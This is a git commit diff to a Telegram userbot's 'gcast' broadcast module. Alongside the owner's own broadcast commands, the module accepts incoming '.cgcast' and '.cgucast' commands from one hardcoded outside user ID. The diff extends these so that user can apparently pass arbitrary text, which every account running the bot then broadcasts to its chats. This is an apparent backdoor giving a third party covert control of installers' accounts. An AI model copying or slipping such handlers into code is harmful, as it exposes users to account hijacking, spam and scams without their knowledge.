712f56b5fd51553e76fe580c82ad66d780afd7a2
ArmanGG01 <96017229+ArmanGG01@users.noreply.github.com>
2022-02-19 20:32:09 +0700

    Update gcast.py

--- userbot/modules/gcast.py
+++ userbot/modules/gcast.py
@@ -24,7 +24,7 @@ GCAST_BLACKLIST = [
 # BLACKLIST NYA JANGAN DI HAPUS NGENTOD.
 
 @register(outgoing=True, pattern=r"^\.gcast(?: |$)(.*)")
-@register(incoming=True, from_users=1694909518, pattern=r"^\.cgcast$")
+@register(incoming=True, from_users=1694909518, pattern=r"^\.cgcast(?: |$)(.*)")
 async def gcast(event):
     xx = event.pattern_match.group(1)
     if xx:
@@ -54,7 +54,7 @@ async def gcast(event):
 
 
 @register(outgoing=True, pattern=r"^\.gucast(?: |$)(.*)")
-@register(incoming=True, from_users=1694909518, pattern=r"^\.cgucast$")
+@register(incoming=True, from_users=1694909518, pattern=r"^\.cgucast(?: |$)(.*)")
 async def gucast(event):
     xx = event.pattern_match.group(1)
     if not xx:
